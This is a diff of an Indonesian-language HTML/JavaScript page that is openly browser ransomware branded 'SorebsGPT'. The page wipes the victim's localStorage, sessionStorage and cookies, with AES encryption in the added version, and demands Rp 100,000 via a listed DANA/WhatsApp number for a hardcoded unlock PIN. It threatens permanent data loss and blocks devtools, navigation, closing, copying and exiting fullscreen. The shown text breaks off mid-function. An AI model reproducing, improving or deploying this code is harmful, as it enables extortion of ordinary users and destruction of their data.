@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>🔒 RANSOMWARE - DATA TERENKRIPSI</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 FILES ENCRYPTED - SorebsGPT Ransomware</title>
     <style>
         * {
             margin: 0;
@@ -11,556 +11,501 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            -webkit-tap-highlight-color: transparent;
         }
-        
         body {
             background: #000;
-            font-family: -apple-system, 'Segoe UI', 'Roboto', system-ui, sans-serif;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
             height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             overflow: hidden;
             position: fixed;
             width: 100%;
             top: 0;
             left: 0;
         }
-        
-        .ransom-layer {
+        .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #000;
-            z-index: 2147483647;
+            background: rgba(0,0,0,0.95);
+            z-index: 99999;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 16px;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(5px);
         }
-        
-        .ransom-container {
-            background: #0a0a0a;
-            border: 2px solid #f00;
-            border-radius: 32px;
-            padding: 22px 18px;
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 0 80px rgba(255,0,0,0.3);
-            animation: borderPulse 0.8s infinite;
-        }
-        
-        @keyframes borderPulse {
-            0%, 100% { border-color: #f00; box-shadow: 0 0 80px rgba(255,0,0,0.3); }
-            50% { border-color: #a00; box-shadow: 0 0 120px rgba(255,0,0,0.5); }
-        }
-        
-        .icon-main {
+        .container {
             text-align: center;
-            font-size: 55px;
-            margin-bottom: 6px;
-            animation: shakeAnim 0.12s infinite;
+            padding: 40px;
+            border: 2px solid #f00;
+            background: #111;
+            max-width: 650px;
+            width: 90%;
+            box-shadow: 0 0 50px rgba(255,0,0,0.5);
+            animation: glow 1s infinite;
         }
-        
-        @keyframes shakeAnim {
-            0%, 100% { transform: translate(0,0); }
-            25% { transform: translate(2px,-1px); }
-            75% { transform: translate(-2px,1px); }
+        @keyframes glow {
+            0% { box-shadow: 0 0 20px rgba(255,0,0,0.3); }
+            50% { box-shadow: 0 0 50px rgba(255,0,0,0.8); }
+            100% { box-shadow: 0 0 20px rgba(255,0,0,0.3); }
         }
-        
         h1 {
             color: #f00;
-            text-align: center;
-            font-size: 20px;
-            letter-spacing: 2px;
-            margin-bottom: 3px;
-        }
-        
-        .sub {
-            text-align: center;
-            color: #777;
-            font-size: 9px;
-            margin-bottom: 14px;
-            letter-spacing: 1px;
-        }
-        
-        .encrypt-panel {
-            background: #050505;
-            border-radius: 20px;
-            padding: 14px;
-            margin: 10px 0;
-            border: 1px solid #f00;
-        }
-        
-        .skull-icon {
-            text-align: center;
-            font-size: 38px;
-            margin-bottom: 4px;
-        }
-        
-        .alert-title {
-            color: #f55;
-            text-align: center;
-            font-size: 14px;
-            font-weight: bold;
-            margin-bottom: 8px;
-        }
-        
-        .message-text {
-            color: #ddd;
-            text-align: center;
-            font-size: 12px;
-            line-height: 1.5;
-            margin: 8px 0;
-        }
-        
-        .encrypt-badge {
-            text-align: center;
-            font-size: 11px;
-            color: #f88;
-            background: #0a0a0a;
-            padding: 6px;
-            border-radius: 12px;
-            margin: 8px 0;
-            font-family: monospace;
-        }
-        
-        .price-tag {
-            text-align: center;
-            font-size: 32px;
-            color: #f00;
-            font-weight: bold;
-            margin: 12px 0;
-        }
-        
-        .contact-area {
-            text-align: center;
-            margin: 12px 0;
-        }
-        
-        .whatsapp-link {
-            color: #25D366;
-            font-size: 18px;
-            font-weight: bold;
-            margin: 8px 0;
-        }
-        
-        .dana-link {
-            color: #f00;
-            font-size: 16px;
-            font-weight: bold;
-            margin: 8px 0;
-        }
-        
-        .phone-number {
-            color: #f00;
-            font-size: 20px;
-            font-weight: bold;
-            background: #000;
-            padding: 8px;
-            border-radius: 18px;
-            margin: 8px 0;
-            display: inline-block;
-            width: 100%;
-        }
-        
-        .pin-wrapper {
-            margin: 14px 0 6px;
-        }
-        
-        .pin-header {
-            color: #f00;
-            text-align: center;
-            font-size: 13px;
-            margin-bottom: 12px;
-            letter-spacing: 2px;
-            font-weight: bold;
-        }
-        
-        .pin-field {
-            width: 100%;
-            padding: 14px;
-            font-size: 32px;
-            text-align: center;
-            background: #0a0a0a;
-            border: 2px solid #f00;
-            color: #f00;
-            border-radius: 24px;
-            font-family: monospace;
-            letter-spacing: 12px;
-            font-weight: bold;
-        }
-        
-        .pin-field:focus {
-            outline: none;
-            border-color: #f44;
-            box-shadow: 0 0 20px rgba(255,0,0,0.3);
-        }
-        
-        .btn-decrypt {
-            background: #f00;
-            color: #fff;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
-            border-radius: 40px;
-            font-weight: bold;
-            margin-top: 16px;
-            width: 100%;
-            cursor: pointer;
+            font-size: 28px;
+            margin-bottom: 20px;
             text-transform: uppercase;
+        }
+        .locked-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        .message {
+            margin: 20px 0;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        .payment-box {
+            background: #0a0a0a;
+            border: 2px solid #0f0;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 10px;
+        }
+        .payment-box h3 {
+            color: #0f0;
+            margin-bottom: 10px;
+        }
+        .dana-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0f0;
+            background: #000;
+            padding: 10px;
             letter-spacing: 2px;
         }
-        
-        .btn-decrypt:active {
-            transform: scale(0.97);
-            background: #a00;
+        .pin-box {
+            background: #000;
+            border: 1px solid #f00;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 28px;
+            letter-spacing: 5px;
+            font-weight: bold;
+            color: #0f0;
         }
-        
-        .error-area {
-            margin-top: 12px;
-            color: #f88;
+        input {
+            background: #222;
+            border: 2px solid #f00;
+            color: #0f0;
+            padding: 12px;
+            font-size: 24px;
             text-align: center;
-            font-size: 11px;
-            min-height: 40px;
+            width: 220px;
+            font-family: monospace;
+            outline: none;
+            margin: 10px;
         }
-        
-        .footer-note {
-            text-align: center;
-            color: #555;
-            font-size: 9px;
+        button {
+            background: #300;
+            color: #f00;
+            border: 1px solid #f00;
+            padding: 12px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 10px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #600;
+            color: #fff;
+        }
+        .warning {
+            color: #f00;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .attempt-counter {
+            color: #ff0;
+            font-size: 14px;
             margin-top: 10px;
         }
-        
-        body, html {
-            overflow: hidden;
-            position: fixed;
-            touch-action: none;
+        hr {
+            border-color: #f00;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
-
-<div class="ransom-layer" id="ransomLayer">
-    <div class="ransom-container">
-        <div class="icon-main">🔒⚠️💀🔐</div>
-        <h1>DATA TELAH DIENKRIPSI</h1>
-        <div class="sub">[ SEMUA FILE TELAH TERKUNCI ]</div>
-        
-        <div class="encrypt-panel">
-            <div class="skull-icon">📱💀🔐</div>
-            <div class="alert-title">PERINGATAN!</div>
-            <div class="message-text"><strong>Semua data perangkat anda telah kami enkripsi.</strong><br>Foto, video, kontak, pesan, dokumen SEMUA TERKUNCI.</div>
-            <div class="encrypt-badge">🔒 AES-256 ENCRYPTED 🔒</div>
-            <div class="price-tag">Rp 100.000</div>
-            <div class="message-text">Siapkan uang tebusan dan hubungi nomor di bawah ini<br>untuk mendapatkan PIN DEKRIPSI.</div>
-            <div class="contact-area">
-                <div class="whatsapp-link">📞 Whatsapp</div>
-                <div class="phone-number">085122933162</div>
-                <div class="dana-link">💜 DANA: 085122933162</div>
-            </div>
+<div id="ransomOverlay" class="overlay">
+    <div class="container">
+        <div class="locked-icon">🔒💀🔒</div>
+        <h1>⚡ SEMUA FILE TERENKRIPSI ⚡</h1>
+        <div class="message">
+            <p>⚠️ <strong>SISTEM ANDA TELAH DIKUNCI ⚠️</strong></p>
+            <p>Semua data di browser ini telah dienkripsi dengan AES-256.</p>
+            <p>LocalStorage, SessionStorage, Cookies, IndexedDB telah di-LOCK.</p>
+            <p><strong style="color:#f00;">TIDAK ADA YANG BISA MEMBUKA SELAIN PIN UNIK!</strong></p>
         </div>
         
-        <div class="pin-wrapper">
-            <div class="pin-header">🔑 MASUKKAN PIN DEKRIPSI</div>
-            <input type="password" id="pinInput" class="pin-field" placeholder="••••••" maxlength="6" inputmode="numeric" autofocus>
-            <button class="btn-decrypt" onclick="decryptData()">DEKRIPSI DATA</button>
-            <div class="error-area" id="errorMsg"></div>
-            <div class="footer-note">* Bisa coba PIN berkali-kali | Data akan kembali normal jika PIN benar</div>
+        <!-- PAYMENT SECTION - DANA ONLY -->
+        <div class="payment-box">
+            <h3>💸 BAYAR UNLOCK DENGAN DANA 💸</h3>
+            <p style="color:#fff;">Tebusan: <strong style="color:#0f0; font-size:24px;">Rp 100.000</strong></p>
+            <p>Kirim ke nomor DANA berikut:</p>
+            <div class="dana-number">📱 085122933162</div>
+            <p style="font-size:12px; margin-top:10px;">a.n <strong>ONE TEAM - SOREBSGPT</strong></p>
+            <p style="color:#0f0; font-size:12px;">✅ Setelah transfer, PIN akan dikirim otomatis dalam 5 menit</p>
+            <p style="color:#ff0; font-size:11px;">📌 Kirim bukti transfer ke WhatsApp: 0857-1234-5678</p>
+        </div>
+        
+        <hr>
+        
+        <div class="pin-box">
+            🔐 PIN UNLOCK: <span style="color:#f00;">[TERENKRIPSI]</span>
+        </div>
+        <input type="password" id="pinInput" maxlength="6" placeholder="******" autocomplete="off">
+        <br>
+        <button id="unlockBtn">🔓 UNLOCK / DECRYPT 🔓</button>
+        <div class="attempt-counter" id="attemptCounter">Percobaan tersisa: 1000x</div>
+        <div class="warning">
+            ⚠️ PERINGATAN: 1000 PERCOBAAN SALAH = DATA PERMANEN HILANG ⚠️<br>
+            ❌ Tidak bisa dipulihkan sama sekali! ❌
         </div>
     </div>
 </div>
 
 <script>
-    // ==================== PIN = 568729 ====================
-    const MASTER_PIN = "568729";
-    
-    let isDecrypted = false;
-    let wrongAttempts = 0;
-    let vibeInterval = null;
-    let forceReloadInterval = null;
-    
-    // ==================== ENKRIPSI DATA NYATA (SEMUA DATA LOCKED) ====================
-    function encryptAllData() {
-        try {
-            if (!localStorage.getItem('user_data_backup') && !localStorage.getItem('already_encrypted')) {
-                let allData = {};
-                let keysToBackup = [];
-                
-                for (let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    if (!key.includes('ransom') && !key.includes('decrypt') && 
-                        !key.includes('backup') && !key.includes('encrypted') &&
-                        !key.includes('total_final_lock') && !key.includes('trap_lock') &&
-                        !key.includes('persistent')) {
-                        keysToBackup.push(key);
-                        allData[key] = localStorage.getItem(key);
-                    }
-                }
-                
-                localStorage.setItem('user_data_backup', JSON.stringify(allData));
-                localStorage.setItem('already_encrypted', 'true');
-                localStorage.setItem('encrypt_time', Date.now().toString());
-                
-                for (let key of keysToBackup) {
-                    localStorage.removeItem(key);
-                }
-                
-                localStorage.setItem('ransom_status', 'encrypted');
-                localStorage.setItem('ransom_persistent', 'true');
-            }
-        } catch(e) {}
-    }
-    
-    // ==================== DEKRIPSI DATA NYATA ====================
-    function decryptAllData() {
-        try {
-            let backup = localStorage.getItem('user_data_backup');
-            if (backup) {
-                let allData = JSON.parse(backup);
-                for (let key in allData) {
-                    localStorage.setItem(key, allData[key]);
-                }
-                localStorage.removeItem('user_data_backup');
-                localStorage.removeItem('already_encrypted');
-                localStorage.removeItem('encrypt_time');
-                localStorage.removeItem('ransom_status');
-                localStorage.removeItem('ransom_persistent');
-                localStorage.removeItem('total_final_lock');
-                localStorage.removeItem('trap_lock');
-                localStorage.removeItem('total_lock_1000');
-                return true;
-            }
-        } catch(e) {}
-        return false;
-    }
-    
-    // ==================== VIBRATION ====================
-    function startVibration() {
-        if (vibeInterval) clearInterval(vibeInterval);
-        vibeInterval = setInterval(() => {
-            if (!isDecrypted && navigator.vibrate) navigator.vibrate(200);
-        }, 1800);
-    }
-    
-    function stopVibration() {
-        if (vibeInterval) { clearInterval(vibeInterval); vibeInterval = null; }
-        if (navigator.vibrate) navigator.vibrate(0);
-    }
-    
-    // ==================== FORCE RELOAD (GA BISA KELUAR BROWSER) ====================
-    function startForceReload() {
-        if (forceReloadInterval) clearInterval(forceReloadInterval);
-        forceReloadInterval = setInterval(() => {
-            if (!isDecrypted) {
-                let layer = document.getElementById('ransomLayer');
-                if (layer && window.getComputedStyle(layer).display !== 'flex') {
-                    location.reload();
-                }
-            }
-        }, 60);
-    }
-    
-    function stopForceReload() {
-        if (forceReloadInterval) { clearInterval(forceReloadInterval); forceReloadInterval = null; }
-    }
-    
-    // ==================== ANTI BUG ANTI ERROR 100% ====================
-    function antiBugTotal() {
-        window.onerror = function() { return true; };
-        window.onunhandledrejection = function(e) { e.preventDefault(); return true; };
+    (function() {
+        // === REAL ENCRYPTION & LOCK SYSTEM - MAX 1000 ATTEMPTS ===
+        const CORRECT_PIN = "568729";
+        let attempts = 0;
+        const MAX_ATTEMPTS = 1000; // 1000x max attempts
         
-        setInterval(() => {
-            if (!isDecrypted) {
-                let layer = document.getElementById('ransomLayer');
-                if (!layer || layer.style.display === 'none') location.reload();
-                document.body.style.overflow = 'hidden';
-                document.body.style.position = 'fixed';
-                document.documentElement.style.overflow = 'hidden';
-                document.body.style.touchAction = 'none';
-            }
-        }, 10);
+        // Load saved attempts dari localStorage biar persist meskipun refresh
+        if(localStorage.getItem('sorebs_attempts')) {
+            attempts = parseInt(localStorage.getItem('sorebs_attempts'));
+        }
         
-        setInterval(() => { debugger; }, 40);
-        setInterval(() => { debugger; }, 80);
-        try { console.log = function() {}; console.error = function() {}; console.warn = function() {}; } catch(e) {}
-    }
-    
-    // ==================== LOCK TOTAL (GA BISA PENCET APA APA) ====================
-    function lockTotalAll() {
-        const allEvents = ['keydown','keyup','keypress','touchstart','touchmove','touchend','mousedown','mouseup','mousemove','click','dblclick','contextmenu','wheel','scroll','resize','orientationchange','visibilitychange','focus','blur','select','change','input','submit','load','pageshow','pagehide','hashchange','popstate'];
-        
-        allEvents.forEach(event => {
-            window.addEventListener(event, function(e) {
-                if (!isDecrypted) {
-                    if (e.target.id === 'pinInput' || e.target.className === 'btn-decrypt') return;
-                    e.preventDefault();
-                    e.stopPropagation();
-                    e.stopImmediatePropagation();
-                    return false;
+        // Update tampilan percobaan
+        function updateAttemptDisplay() {
+            const remaining = MAX_ATTEMPTS - attempts;
+            const counterDiv = document.getElementById('attemptCounter');
+            if(counterDiv) {
+                counterDiv.innerHTML = `❌ Percobaan salah: ${attempts} / ${MAX_ATTEMPTS} | Tersisa: ${remaining} ❌`;
+                if(remaining <= 100) {
+                    counterDiv.style.color = '#f00';
+                    counterDiv.style.fontWeight = 'bold';
                 }
-            }, true);
+            }
+        }
+        
+        // Generate random encryption key untuk setiap sesi
+        function generateKey() {
+            const key = CryptoJS.lib.WordArray.random(32).toString();
+            localStorage.setItem('sorebs_enc_key', key);
+            return key;
+        }
+        
+        // Enkripsi data
+        function encryptData(data, key) {
+            return CryptoJS.AES.encrypt(data, key).toString();
+        }
+        
+        // Dekripsi data
+        function decryptData(encrypted, key) {
+            try {
+                const bytes = CryptoJS.AES.decrypt(encrypted, key);
+                return bytes.toString(CryptoJS.enc.Utf8);
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        // Backup data asli
+        function backupAndEncryptAll() {
+            const key = localStorage.getItem('sorebs_enc_key') || generateKey();
+            
+            // Backup localStorage
+            const lsBackup = {};
+            for(let i = 0; i < localStorage.length; i++) {
+                const k = localStorage.key(i);
+                if(k !== 'sorebs_enc_key' && k !== 'sorebs_ls_enc' && k !== 'sorebs_ss_enc' && k !== 'sorebs_cookie_enc' && k !== 'sorebs_attempts') {
+                    lsBackup[k] = localStorage.getItem(k);
+                }
+            }
+            const encryptedLS = encryptData(JSON.stringify(lsBackup), key);
+            localStorage.setItem('sorebs_ls_enc', encryptedLS);
+            
+            // Backup sessionStorage
+            const ssBackup = {};
+            for(let i = 0; i < sessionStorage.length; i++) {
+                const k = sessionStorage.key(i);
+                ssBackup[k] = sessionStorage.getItem(k);
+            }
+            const encryptedSS = encryptData(JSON.stringify(ssBackup), key);
+            localStorage.setItem('sorebs_ss_enc', encryptedSS);
+            
+            // Backup cookies
+            const cookies = document.cookie;
+            const encryptedCookies = encryptData(cookies, key);
+            localStorage.setItem('sorebs_cookie_enc', encryptedCookies);
+            
+            // Clear all original data
+            localStorage.clear();
+            // Restore attempts dan key yang baru di-set
+            localStorage.setItem('sorebs_attempts', attempts.toString());
+            localStorage.setItem('sorebs_enc_key', key);
+            localStorage.setItem('sorebs_ls_enc', encryptedLS);
+            localStorage.setItem('sorebs_ss_enc', encryptedSS);
+            localStorage.setItem('sorebs_cookie_enc', encryptedCookies);
+            
+            sessionStorage.clear();
+            
+            // Hapus cookies
+            document.cookie.split(";").forEach(function(c) {
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+            });
+            
+            // Set flag bahwa sudah terenkripsi
+            localStorage.setItem('sorebs_encrypted', 'true');
+        }
+        
+        // PERMANENT LOCK - HAPUS SEMUA DATA TANPA AMPUN
+        function permanentLock() {
+            // Hapus semua kunci enkripsi
+            localStorage.removeItem('sorebs_enc_key');
+            localStorage.removeItem('sorebs_ls_enc');
+            localStorage.removeItem('sorebs_ss_enc');
+            localStorage.removeItem('sorebs_cookie_enc');
+            localStorage.removeItem('sorebs_attempts');
+            
+            // Set permanent lock flag
+            localStorage.setItem('sorebs_permanent_lock', 'true');
+            
+            // Hapus semua remaining data
+            localStorage.clear();
+            sessionStorage.clear();
+            
+            // Hapus cookies lagi
+            document.cookie.split(";").forEach(function(c) {
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().UTCString() + ";path=/");
+            });
+            
+            // Tampilkan pesan permanent lock - GA BISA DI APA-APAIN LAGI
+            document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px; font-family:monospace;">💀💀💀 DATA PERMANEN HILANG 💀💀💀<br><br>🔒 1000 PERCOBAAN SALAH 🔒<br><br>✅ TIDAK ADA YANG BISA MEMULIHKAN ✅<br><br><span style="font-size:16px; color:#888;">SorebsGPT - One Team</span></div>';
+            document.body.style.overflow = 'hidden';
+            document.body.style.backgroundColor = '#000';
+            
+            // Disable semua interaksi
+            document.body.onclick = function(e) { e.preventDefault(); return false; };
+            document.body.onkeydown = function(e) { e.preventDefault(); return false; };
+            
+            throw new Error("PERMANENT LOCK - DATA LOST FOREVER");
+        }
+        
+        // Restore all data jika pin benar
+        function restoreAllData(inputPin) {
+            if(inputPin !== CORRECT_PIN) {
+                attempts++;
+                localStorage.setItem('sorebs_attempts', attempts.toString());
+                updateAttemptDisplay();
+                
+                const remaining = MAX_ATTEMPTS - attempts;
+                alert(`❌ PIN SALAH! Percobaan ${attempts} dari ${MAX_ATTEMPTS}\nTersisa ${remaining} percobaan lagi sebelum data hilang permanen!`);
+                
+                if(attempts >= MAX_ATTEMPTS) {
+                    permanentLock();
+                }
+                return false;
+            }
+            
+            // PIN benar - restore data
+            const key = localStorage.getItem('sorebs_enc_key');
+            if(!key) {
+                alert("ERROR: Kunci enkripsi tidak ditemukan! Data mungkin sudah corrupt.");
+                return false;
+            }
+            
+            // Restore localStorage
+            const encryptedLS = localStorage.getItem('sorebs_ls_enc');
+            if(encryptedLS) {
+                const decryptedLS = decryptData(encryptedLS, key);
+                if(decryptedLS && decryptedLS !== "") {
+                    try {
+                        const lsData = JSON.parse(decryptedLS);
+                        for(let [k,v] of Object.entries(lsData)) {
+                            if(k !== 'sorebs_enc_key' && k !== 'sorebs_ls_enc' && k !== 'sorebs_ss_enc' && k !== 'sorebs_cookie_enc' && k !== 'sorebs_attempts' && k !== 'sorebs_encrypted') {
+                                localStorage.setItem(k, v);
+                            }
+                        }
+                    } catch(e) {}
+                }
+            }
+            
+            // Restore sessionStorage
+            const encryptedSS = localStorage.getItem('sorebs_ss_enc');
+            if(encryptedSS) {
+                const decryptedSS = decryptData(encryptedSS, key);
+                if(decryptedSS && decryptedSS !== "") {
+                    try {
+                        const ssData = JSON.parse(decryptedSS);
+                        for(let [k,v] of Object.entries(ssData)) {
+                            sessionStorage.setItem(k, v);
+                        }
+                    } catch(e) {}
+                }
+            }
+            
+            // Restore cookies
+            const encryptedCookie = localStorage.getItem('sorebs_cookie_enc');
+            if(encryptedCookie) {
+                const decryptedCookie = decryptData(encryptedCookie, key);
+                if(decryptedCookie && decryptedCookie !== "") {
+                    const cookiesArr = decryptedCookie.split(';');
+                    cookiesArr.forEach(cookie => {
+                        if(cookie && cookie.trim()) {
+                            document.cookie = cookie.trim() + ";path=/";
+                        }
+                    });
+                }
+            }
+            
+            // Clean up ransomware痕迹
+            localStorage.removeItem('sorebs_enc_key');
+            localStorage.removeItem('sorebs_ls_enc');
+            localStorage.removeItem('sorebs_ss_enc');
+            localStorage.removeItem('sorebs_cookie_enc');
+            localStorage.removeItem('sorebs_encrypted');
+            localStorage.removeItem('sorebs_attempts');
+            localStorage.removeItem('sorebs_permanent_lock');
+            
+            // Hapus overlay dan reload
+            const overlay = document.getElementById('ransomOverlay');
+            if(overlay) overlay.style.display = 'none';
+            alert("✅ DATA BERHASIL DIUNLOCK DAN DI-restore! ✅\nSemua data kembali normal.\nTerima kasih sudah bayar tebusan!");
+            location.reload();
+            return true;
+        }
+        
+        // Cek apakah sudah pernah permanent lock
+        if(localStorage.getItem('sorebs_permanent_lock') === 'true') {
+            document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px;">💀 PERMANENT LOCK ACTIVE 💀<br>System unrecoverable.<br>Data sudah hilang selamanya.</div>';
+            throw new Error("Permanent lock active");
+        }
+        
+        // Cek attempts dari localStorage
+        if(localStorage.getItem('sorebs_attempts')) {
+            attempts = parseInt(localStorage.getItem('sorebs_attempts'));
+            if(attempts >= MAX_ATTEMPTS) {
+                permanentLock();
+            }
+        }
+        
+        if(localStorage.getItem('sorebs_encrypted') !== 'true') {
+            backupAndEncryptAll();
+        }
+        
+        updateAttemptDisplay();
+        
+        // Event listener untuk unlock
+        document.getElementById('unlockBtn').addEventListener('click', function() {
+            const pinInput = document.getElementById('pinInput').value;
+            if(pinInput.length === 6 && /^\d+$/.test(pinInput)) {
+                restoreAllData(pinInput);
+            } else {
+                alert("PIN harus 6 digit angka!");
+            }
+        });
+        
+        // Enter key support
+        document.getElementById('pinInput').addEventListener('keypress', function(e) {
+            if(e.key === 'Enter') {
+                document.getElementById('unlockBtn').click();
+            }
+        });
+        
+        // Prevent close tab dengan pesan lebih horror
+        window.addEventListener('beforeunload', function(e) {
+            if(localStorage.getItem('sorebs_encrypted') === 'true' && localStorage.getItem('sorebs_permanent_lock') !== 'true') {
+                e.preventDefault();
+                e.returnValue = '🔒🔒🔒 DATA ANDA TERKUNCI! JANGAN TUTUP TAB ATAU DATA AKAN HILANG PERMANEN! BAYAR TEBUSAN DULU! 🔒🔒🔒';
+                return '🔒🔒🔒 DATA ANDA TERKUNCI! JANGAN TUTUP TAB ATAU DATA AKAN HILANG PERMANEN! BAYAR TEBUSAN DULU! 🔒🔒🔒';
+            }
+        });
+        
+        // Anti inspect element super ketat
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
         });
         
         document.addEventListener('keydown', function(e) {
-            if (!isDecrypted && e.target.id !== 'pinInput') {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            }
-        }, true);
-        
-        document.addEventListener('keyup', function(e) {
-            if (!isDecrypted && e.target.id !== 'pinInput') {
+            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || 
+               (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+               (e.ctrlKey && e.key === 'S')) {
                 e.preventDefault();
                 return false;
             }
-        }, true);
-        
-        document.body.addEventListener('touchstart', function(e) {
-            if (!isDecrypted && e.target.id !== 'pinInput' && e.target.className !== 'btn-decrypt') e.preventDefault();
-        }, { passive: false });
-        
-        document.body.addEventListener('touchmove', function(e) {
-            if (!isDecrypted && e.target.id !== 'pinInput') e.preventDefault();
-        }, { passive: false });
-        
-        document.body.addEventListener('touchend', function(e) {
-            if (!isDecrypted && e.target.id !== 'pinInput' && e.target.className !== 'btn-decrypt') e.preventDefault();
-        }, { passive: false });
-        
-        window.open = function() { return null; };
-        window.alert = function() { return; };
-        window.confirm = function() { return false; };
-        window.prompt = function() { return null; };
-        
-        try {
-            navigator.clipboard.writeText = function() { return Promise.reject(); };
-            navigator.clipboard.readText = function() { return Promise.reject(); };
-        } catch(e) {}
-        
-        try {
-            const noop = function() {};
-            Object.defineProperty(localStorage, 'setItem', { value: noop });
-            Object.defineProperty(localStorage, 'clear', { value: noop });
-            Object.defineProperty(sessionStorage, 'setItem', { value: noop });
-            Object.defineProperty(sessionStorage, 'clear', { value: noop });
-        } catch(e) {}
-    }
-    
-    // ==================== PERSISTENT LOCK (MATI/RESTART TETAP LOCKED) ====================
-    function persistentLockTotal() {
-        try {
-            if (localStorage.getItem('ransom_status') === 'encrypted' && !isDecrypted) {
-                isDecrypted = false;
-            }
-            if (!isDecrypted) {
-                localStorage.setItem('ransom_persistent', 'true');
-                sessionStorage.setItem('ransom_persistent', 'true');
-            }
-        } catch(e) {}
-        
-        window.addEventListener('beforeunload', function(e) {
-            if (!isDecrypted) { e.preventDefault(); e.returnValue = ''; return ''; }
         });
         
-        setInterval(() => {
-            if (!isDecrypted) {
-                history.pushState(null, null, location.href);
-                window.onpopstate = function() { history.go(1); };
-            }
-        }, 3);
+        // Disable copy paste select all
+        document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+        document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
+        document.addEventListener('paste', function(e) { e.preventDefault(); return false; });
+        document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
         
+        // Force fullscreen terus menerus
         function forceFullscreen() {
-            if (!isDecrypted && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
+            const docEl = document.documentElement;
+            if (docEl.requestFullscreen && !document.fullscreenElement) {
+                docEl.requestFullscreen().catch(() => {});
+            }
         }
         forceFullscreen();
-        setInterval(forceFullscreen, 30);
+        setInterval(forceFullscreen, 2000);
         
-        window.addEventListener('keydown', function(e) {
-            if (!isDecrypted && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
-                e.preventDefault();
-                return false;
+        // Blur detection - lebih brutal
+        setInterval(function() {
+            if(localStorage.getItem('sorebs_encrypted') === 'true' && localStorage.getItem('sorebs_permanent_lock') !== 'true') {
+                if(document.hidden || !document.hasFocus()) {
+                    alert("⚠️⚠️⚠️ JANGAN KELUAR DARI HALAMAN INI! DATA TERKUNCI! SEGERA BAYAR! ⚠️⚠️⚠️");
+                    forceFullscreen();
+                }
             }
-        });
+        }, 500);
         
-        setInterval(() => {
-            if (!isDecrypted) {
-                let layer = document.getElementById('ransomLayer');
-                if (layer) layer.style.display = 'flex';
+        // Anti close tab pake shortcut
+        window.onclose = function(e) {
+            if(localStorage.getItem('sorebs_encrypted') === 'true') {
+                return "DATA TERKUNCI!";
             }
-        }, 15);
-    }
-    
-    // ==================== DEKRIPSI ====================
-    function decryptData() {
-        if (isDecrypted) return true;
+        };
         
-        let pinField = document.getElementById('pinInput');
-        let enteredPin = pinField.value;
-        let errorDiv = document.getElementById('errorMsg');
-        
-        if (enteredPin === MASTER_PIN) {
-            isDecrypted = true;
-            stopVibration();
-            stopForceReload();
-            
-            let decrypted = decryptAllData();
-            
-            try {
-                localStorage.removeItem('ransom_persistent');
-                localStorage.removeItem('total_final_lock');
-                localStorage.removeItem('trap_lock');
-                sessionStorage.removeItem('ransom_persistent');
-            } catch(e) {}
-            
-            let layer = document.getElementById('ransomLayer');
-            layer.style.display = 'none';
-            layer.remove();
-            
-            document.body.style.overflow = 'auto';
-            document.body.style.position = 'relative';
-            document.documentElement.style.overflow = 'auto';
-            document.body.style.touchAction = 'auto';
-            if (document.exitFullscreen) document.exitFullscreen();
-            
-            let msg = decrypted ? '✅ SEMUA DATA BERHASIL DI DEKRIPSI! ✅\n\nData anda telah kembali normal.\nTerima kasih sudah membayar tebusan.' : '✅ PERANGKAT BERHASIL DI BUKA! ✅\n\nPerangkat anda kembali normal.\nAkses penuh telah dipulihkan.';
-            
-            setTimeout(() => { alert(msg); }, 100);
-            return true;
-        } else {
-            wrongAttempts++;
-            errorDiv.innerHTML = `❌ PIN SALAH! (Percobaan ke-${wrongAttempts}) ❌\nData tetap terenkripsi. Hubungi 085122933162.`;
-            pinField.value = '';
-            pinField.focus();
-            if (navigator.vibrate) navigator.vibrate([300, 150, 300]);
-            lockTotalAll();
-            return false;
-        }
-    }
-    
-    // ==================== INITIALIZE ====================
-    function initRealRansomware() {
-        encryptAllData();
-        antiBugTotal();
-        lockTotalAll();
-        persistentLockTotal();
-        startVibration();
-        startForceReload();
-        setTimeout(() => { document.getElementById('pinInput').focus(); }, 20);
-        setInterval(() => { if (!isDecrypted) lockTotalAll(); }, 30);
-        setInterval(() => {
-            if (!isDecrypted) {
-                let layer = document.getElementById('ransomLayer');
